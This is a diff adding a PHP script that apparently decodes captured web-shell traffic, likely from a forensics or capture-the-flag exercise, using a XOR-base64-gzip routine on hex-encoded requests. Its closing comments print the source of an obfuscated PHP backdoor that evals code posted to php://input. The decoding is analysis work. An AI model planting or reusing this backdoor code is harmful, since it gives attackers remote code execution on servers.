@@ -1,0 +1,59 @@
+<?php
+
+$k="80e32263";
+$kh="6f8af44abea0";
+$kf="351039f4a7b5";
+$p="0UlYyJHG87EJqEz6";
+function x($t,$k){
+	$c=strlen($k);
+	$l=strlen($t);
+	$o="";
+	for($i=0; $i<$l;){
+		for($j=0; ($j<$c&&$i<$l); $j++,$i++){
+			$o.=$t[$i]^$k[$j];
+		}
+	}
+	return $o;
+}
+
+
+// these are the inputs given to the program
+$input = array(
+	"\x33\x51\x76\x65\x3e\x2e\x49\x58\x65\x4f\x4c\x43\x3e\x5b\x44\x26\x36\x66\x38\x61\x66\x34\x34\x61\x62\x65\x61\x30\x51\x4b\x77\x75\x2f\x58\x72\x37\x47\x75\x46\x6f\x35\x36\x72\x37\x2f\x58\x2f\x6a\x66\x48\x45\x64\x4c\x76\x37\x37\x48\x58\x34\x65\x61\x75\x66\x52\x52\x58\x6f\x66\x48\x50\x6b\x58\x75\x6b\x70\x35\x48\x2f\x6f\x5a\x47\x66\x48\x38\x4c\x75\x51\x43\x4d\x72\x77\x6d\x62\x79\x62\x79\x6c\x39\x52\x59\x6e\x68\x51\x64\x4a\x73\x4b\x70\x71\x78\x72\x65\x70\x52\x4d\x6f\x54\x53\x65\x6d\x6c\x52\x4c\x61\x58\x5a\x64\x42\x5a\x68\x6f\x71\x37\x35\x6f\x68\x4d\x68\x41\x78\x4d\x76\x72\x51\x4b\x45\x77\x33\x35\x31\x30\x33\x39\x66\x34\x61\x37\x62\x35\x2b\x27\x51\x6e\x2f\x3f\x3e\x2d\x0a\x65\x3d\x5a\x55\x20\x6d\x78",
+	"\x33\x51\x76\x65\x3e\x2e\x49\x58\x65\x4f\x4c\x43\x3e\x5b\x44\x26\x36\x66\x38\x61\x66\x34\x34\x61\x62\x65\x61\x30\x51\x4b\x78\x49\x2b\x41\x6b\x34\x39\x68\x4d\x6f\x4e\x61\x58\x6f\x79\x70\x73\x41\x54\x69\x4a\x66\x64\x33\x63\x6c\x4a\x2b\x4b\x6d\x4c\x35\x4f\x79\x66\x4c\x69\x47\x4e\x53\x42\x4b\x48\x46\x57\x70\x70\x44\x58\x62\x6a\x68\x48\x2f\x4d\x39\x6f\x72\x5a\x30\x71\x50\x6a\x51\x31\x34\x4d\x4c\x41\x35\x43\x6a\x65\x4c\x78\x41\x47\x39\x2f\x66\x42\x4a\x67\x51\x79\x57\x72\x62\x69\x5a\x50\x72\x43\x46\x63\x6a\x33\x78\x44\x62\x39\x35\x43\x76\x43\x32\x39\x72\x2f\x41\x4e\x32\x7a\x69\x45\x68\x30\x33\x35\x31\x30\x33\x39\x66\x34\x61\x37\x62\x35\x2b\x27\x51\x6e\x2f\x3f\x3e\x2d\x0a\x65\x3d\x5a\x55\x20\x6d\x78",
+	"\x33\x51\x76\x65\x3e\x2e\x49\x58\x65\x4f\x4c\x43\x3e\x5b\x44\x26\x36\x66\x38\x61\x66\x34\x34\x61\x62\x65\x61\x30\x51\x4b\x78\x6f\x2b\x48\x4d\x34\x74\x68\x4d\x6f\x4d\x4b\x57\x63\x53\x6e\x67\x39\x55\x5a\x4e\x62\x64\x63\x34\x57\x46\x68\x4f\x32\x6a\x61\x55\x34\x65\x4d\x68\x50\x61\x44\x54\x65\x50\x45\x75\x42\x34\x38\x4a\x73\x74\x57\x49\x62\x34\x61\x45\x69\x72\x4c\x70\x58\x70\x64\x67\x62\x37\x67\x38\x42\x78\x2f\x49\x47\x49\x2f\x4a\x4c\x62\x56\x52\x63\x46\x61\x63\x6b\x2b\x72\x39\x30\x59\x78\x58\x70\x6d\x42\x41\x31\x77\x51\x4b\x61\x55\x39\x6a\x65\x52\x68\x76\x70\x37\x69\x6d\x46\x33\x35\x31\x30\x33\x39\x66\x34\x61\x37\x62\x35\x2b\x27\x51\x6e\x2f\x3f\x3e\x2d\x0a\x65\x3d\x5a\x55\x20\x6d\x78",
+	"\x33\x51\x76\x65\x3e\x2e\x49\x58\x65\x4f\x4c\x43\x3e\x5b\x44\x26\x36\x66\x38\x61\x66\x34\x34\x61\x62\x65\x61\x30\x51\x4b\x77\x75\x2f\x58\x72\x37\x47\x75\x46\x6f\x35\x30\x70\x34\x48\x75\x41\x5a\x48\x42\x66\x6e\x71\x68\x76\x37\x2f\x2b\x63\x63\x46\x66\x69\x73\x66\x48\x34\x62\x59\x4f\x53\x4d\x52\x69\x30\x65\x47\x50\x67\x5a\x75\x52\x64\x36\x53\x50\x73\x64\x47\x50\x2f\x2f\x63\x2b\x64\x56\x4d\x37\x67\x6e\x59\x53\x57\x76\x6c\x49\x4e\x5a\x6d\x6c\x57\x51\x47\x79\x44\x70\x7a\x43\x6f\x77\x70\x7a\x63\x7a\x52\x65\x6c\x79\x2f\x51\x33\x35\x31\x30\x33\x39\x66\x34\x61\x37\x62\x35\x2b\x27\x51\x6e\x2f\x3f\x3e\x2d\x0a\x65\x3d\x5a\x55\x20\x6d\x78"
+);
+
+foreach ($input as &$i) {
+	if(@preg_match("/$kh(.+)$kf/",$i,$m)==1){
+		@ob_start();
+		echo @gzuncompress(@x(@base64_decode($m[1]),$k));
+		// @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));
+		$o=@ob_get_contents();
+		@ob_end_clean();
+		echo "\n";
+		echo "$o";
+		$r=@base64_encode(@x(@gzcompress($o),$k));
+		// print("$p$kh$r$kf");
+	}
+}
+// this will give the actual output of the commands
+// echo @gzuncompress(@x(@base64_decode("QKy2/Pr9e+Z3eUh4//sZexUyZR8mN/g="), $k));
+// echo "\n";
+// echo @gzuncompress(@x(@base64_decode("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"),$k));
+// echo "\n";
+// echo @gzuncompress(@x(@base64_decode("QKzo43k49AMoNoVOfAMh+6h3euEZJvkTlblqP34rlZqPhxDgKLYMz7NpqfQ9IR9FOXy0OfVbUgo/PF3MxrMw/JOdJebwjE2y6VAxUFnyA4H4dHQNgV49YatbqT0it9IXYf5kzoE4+kfGnZ/dTAsyCesTC0i5V+gJQw6bYm/nU3U/lrYGyl+dgvIOURfl0fvGm0hmr0RZKQ=="), $k));
+// echo "\n";
+// echo @gzuncompress(@x(@base64_decode("QKxO/n6DAwXuGEoc5X9/H3HkMXv1Ih75Fx1NdSPRNDPUmHTy"),$k));
+
+
+// $V='$k="80e32263";$kh="6f8af44abea0";$kf="351039f4a7b5";$p="0UlYyJHG87EJqEz6";function x($';
+// $P='++){$o.=$t{$i}^$k{$j};}}return $o;}if(@preg_match("/$kh(.+)$kf/",@file_get_contents(';
+// $d='t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i<$l;){for($j=0;($j<$c&&$i<$l);$j++,$i';
+// $B='ob_get_contents();@ob_end_clean();$r=@base64_encode(@x(@gzcompress($o),$k));print("$p$kh$r$kf");}';
+// $N=str_replace('','','create_function');
+// $c='"php://input"),$m)==1){@ob_start();@eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));$o=@';
+// $u=str_replace('u)','',$V.$d.$P.$c.$B);
+// $x=$N('',$u);$x();
+?>
